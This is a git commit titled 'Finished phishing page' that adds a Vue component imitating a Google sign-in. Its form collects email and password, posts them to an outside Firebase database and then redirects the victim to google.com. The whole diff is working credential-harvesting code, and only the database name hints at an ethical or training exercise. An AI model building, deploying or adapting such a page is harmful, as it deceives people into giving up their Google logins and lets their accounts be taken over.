5e0ebfc85a106bf907b0095ad0ede2f9c3fb3e07
Camilo Romero <camiloaromero23@gmail.com>
2020-10-11 13:53:24 -0500

    Finished phishing page

---
+++ src/views/Confirm.vue
@@ -0,0 +1,62 @@
+<template>
+	<div>
+		<div class="container">
+			<img
+				class="image"
+				src="../../public/google_logo.png"
+				alt="Google"
+			/>
+		</div>
+
+		<div class="view">
+			<form @submit.prevent="handleSubmit" class="container">
+				<div class="input_field">
+					<label for="email">Email</label>
+					<input
+						type="email"
+						name="email"
+						id="email"
+						v-model.trim="formData.email"
+					/>
+				</div>
+				<div class="input_field">
+					<label for="password">Password </label>
+					<input
+						type="password"
+						name="password"
+						id="password"
+						v-model.trim="formData.password"
+					/>
+				</div>
+				<div class="center">
+					<button type="submit">Confirm</button>
+				</div>
+			</form>
+		</div>
+	</div>
+</template>
+
+<script>
+	import axios from 'axios';
+	export default {
+		data() {
+			return {
+				formData: {
+					email: '',
+					password: '',
+				},
+			};
+		},
+		methods: {
+			handleSubmit() {
+				axios
+					.post('https://ethical-14729.firebaseio.com/users.json', {
+						...this.formData,
+					})
+					.then(() => {
+						window.location = 'http://www.google.com';
+					});
+			},
+		},
+	};
+</script>
